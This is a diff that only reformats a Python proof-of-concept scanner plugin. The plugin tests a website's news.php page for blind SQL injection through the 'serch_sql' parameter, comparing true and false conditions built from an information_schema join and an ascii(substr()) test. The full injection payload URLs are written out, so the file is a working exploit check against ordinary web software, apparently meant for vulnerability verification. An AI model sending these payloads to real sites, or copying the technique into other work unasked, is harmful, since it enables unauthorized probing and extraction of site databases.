@@ -40,9 +40,10 @@ class Poc(ABPoc):
                 }
             }
         }
-                    
+
     def verify(self):
-        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
+        self.target = self.target.rstrip(
+            '/') + '/' + (self.get_option('base_path').lstrip('/'))
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
@@ -53,12 +54,12 @@ class Poc(ABPoc):
             code, head, res, err, _ = hh.http(self.target + '/news/')
             if code != 200:
                 return False
-            #print res
+            # print res
             m = re.search(
                 r'(/news.php\?[a-zA-Z0-9&=]*class[\d]+=[\d]+)[\'"]', res)
             if m == None:
                 return False
-            #print m.group(1)
+            # print m.group(1)
             # 注入点
             # 条件真
             payload = self.target + '/news' + \
@@ -66,7 +67,7 @@ class Poc(ABPoc):
             # 条件假
             verify = self.target + '/news' + \
                 m.group(1) + '&serch_sql=as%20a%20join%20information_schema.CHARACTER_SETS%20as%20b%20where%20if(ascii(substr(b.CHARACTER_SET_NAME,1,1))>255,1,0)%20limit%201--%20sd&imgproduct=xxxx'
-            #print payload
+            # print payload
             #proxy = ('127.0.0.1', 8887)
             code, head, payload_res, err, _ = hh.http(payload)
             if code != 200:
